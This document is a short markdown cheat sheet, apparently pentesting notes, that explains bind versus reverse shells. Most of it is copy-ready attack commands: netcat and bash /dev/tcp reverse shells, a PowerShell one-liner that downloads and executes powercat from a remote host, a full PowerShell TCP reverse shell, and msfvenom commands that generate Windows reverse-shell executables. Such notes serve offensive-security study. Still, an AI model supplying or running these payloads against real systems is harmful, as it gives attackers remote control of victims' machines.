# Shells

This section is all about shells

## Bind shell vs reverse shell

### Bind shell

Basically, we are opening a port with our shell for other people to execute

- Client computer starts up a listening session with shell executing on that port
- Connector just connects to the listening port that has shell already running

### Reverse shell

Basically, we are sending our own shell over to the operator

- Operator listens on a port
- Client computer connects to the listening port on the operator with the client's own shell
- Operator now has control of clients shell

#### Netcat reverse shell

```sh
nc <listening_host> <listening_port> -e /bin/bash
```

#### TCP revsrse shell

```sh
/bin/bash -i > /dev/tcp/<attacker_ip>/<port> 0<&1 2>&1
```

#### Powercat reverse shell example

```cmd
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
```

#### Powershell reverse shell

```sh
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.194',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Generating shell payloads

### Stageless payload (catchable with netcat)

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.194 LPORT=80 -f exe > shell.exe
```

### Staged payloads (caught with meterpreter or other programs)

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=5555 -f exe > binary.exe
```
